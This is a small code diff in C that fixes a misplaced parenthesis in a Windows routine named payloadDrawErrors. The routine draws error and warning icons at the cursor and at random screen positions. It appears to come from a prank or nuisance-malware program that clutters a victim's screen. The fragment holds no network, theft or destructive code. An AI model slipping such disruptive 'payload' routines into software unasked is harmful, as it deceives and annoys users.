@@ -210,7 +210,7 @@ int payloadDrawErrors(PAYLOADFUNC) {
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_INFORMATION));
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_APPLICATION));
-	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING)));
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING));
         DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_HAND));
 	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
 		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
